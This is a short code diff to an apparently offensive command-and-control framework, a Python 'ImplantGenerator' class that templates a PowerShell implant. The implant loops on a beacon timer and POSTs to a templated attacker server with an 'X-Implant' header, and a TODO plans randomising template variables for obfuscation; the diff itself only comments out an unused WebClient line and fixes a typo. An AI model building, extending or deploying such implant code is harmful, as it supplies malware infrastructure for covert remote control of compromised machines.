@@ -46,13 +46,12 @@ class ImplantGenerator():
         '''
     text = '''
     $sleep={{ beacon }}
-    $wc = New-Object System.Net.WebClient
+    # $wc = New-Object System.Net.WebClient
     while($true){
         start-sleep($sleep)
         $headers = @{}
         $headers.Add("X-Implant","{{ uii }}")
         try {
-            #$LoginResponse = $wc.
             $LoginResponse = Invoke-WebRequest '{{ http }}://{{url}}:{{port}}/index' -Headers $headers -Body $Body -Method 'POST'
         }
         catch {
@@ -93,7 +92,7 @@ class ImplantGenerator():
         print("Randomising Jinja2 Variables")
         # TODO: Complete for level 0 obfuscation
         # -- Iterate over all variables contained within self.JinjaRandomisedArgs and replace the value
-        # --    ensure that all variable are unqiue.
+        # --    ensure that all variable values are unqiue.
         return JinjaRandomisedArgs
 
     # -- Public Functions
